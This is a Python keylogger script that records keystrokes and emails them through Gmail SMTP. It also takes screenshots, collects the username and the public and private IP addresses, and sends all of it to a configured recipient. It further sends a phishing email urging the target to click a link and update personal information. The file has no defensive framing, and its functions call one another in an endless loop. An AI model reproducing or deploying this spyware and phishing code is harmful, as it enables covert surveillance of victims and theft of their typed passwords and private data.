import smtplib
import ssl
import socket
from pynput.keyboard import Key, Listener
import time, os
import requests 
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import pyautogui



count = 0
keys = []
tree = False


def phis_mail():
    global tree
    if not tree:
        
        # Setup port number and server name
        smtp_port = 587                 # Standard secure SMTP port
        smtp_server = "smtp.gmail.com"  # Google SMTP Server

        email_from = "" #Replace with your sender email
        email_to = "" #Replace with your reciever email

        pswd = "" #App password
        subject = "Important Update"
        message = """Dear User, we require you to update your personal information immediately. Click here: https://viva.instructure.com/r"""
        # content of message
        email_message = f"Subject: {subject}\n\n{message}"  

        # Create context
        simple_email_context = ssl.create_default_context()

        try:
            # Connect to the server
            print("Connecting to server...")
            TIE_server = smtplib.SMTP(smtp_server, smtp_port)
            TIE_server.starttls(context=simple_email_context)
            TIE_server.login(email_from, pswd)
            print("Connected to server :-)")
    
            # Send the actual email
            print()
            print(f"Sending email to - {email_to}")
            TIE_server.sendmail(email_from, email_to, email_message)
            print(f"Email successfully sent to - {email_to}")

        # If there's an error, print it out
        except Exception as e:
            print(e)

        # Close the port
        finally:
            TIE_server.quit()
        tree = True
        
    else:
        exit

def screenshot():
    # Capture screenshot
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")

    # Set up the SMTP server and the email details
    smtp_server = "smtp.gmail.com"
    port = 587  # For starttls
    sender_email = "" #Replace with your sender email
    password = "" #app password
    receiver_email = "" #Replace with your receiver email

    # Create a multipart message and set headers    
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = "Screenshot"

    # Add screenshot as an attachment
    with open("screenshot.png", "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    # Encode file in ASCII characters to send by email    
    encoders.encode_base64(part)

    # Add header as pdf attachment
    part.add_header(
        "Content-Disposition",
        f"attachment; filename= screenshot.png",
    )

    # Add attachment to message and convert message to string
    message.attach(part)
    text = message.as_string()

    # Log in to server using secure context and send email
    context = smtplib.SMTP(smtp_server, port)
    context.starttls()
    context.login(sender_email, password)
    context.sendmail(sender_email, receiver_email, text)
    context.quit()

    
        
def send_email(message):
    phis_mail()
    sys_info()
    screenshot()
    smtp_server = "smtp.gmail.com"
    port = 587
    sender_email = ""  # Replace with your sender email
    password = ""  # Replace with your sender email password
    receiver_email = ""  # Replace with the receiver's email

    context = ssl.create_default_context()

    try:
        server = smtplib.SMTP(smtp_server, port)
        server.ehlo()
        server.starttls(context=context)
        server.ehlo()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message)

    except Exception as e:
        print(e)
    finally:
        server.quit()


def on_press(key):
    global keys, count
    keys.append(str(key))
    count += 1
    if count > 10:
        count = 0
        email(keys)

def sys_info():
    datetime = time.ctime(time.time())
    user = os.path.expanduser('~').split('\\')[2]
    publicIP = requests.get('https://api.ipify.org/').text
    privateIP = socket.gethostbyname(socket.gethostname())

    msg = f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'
    send_email(msg)

def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'", "")
        if key == "Key.space":
            k = " "
        elif key == "Key.backspace":
            k = " Backspace "
        elif key == "Key.enter":
            k = " Enter "
        elif key == "Key.shift":
            k = " Shift "
        elif key.find("Key") > 0:
            k = ""
        message += k
    send_email(message)


def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
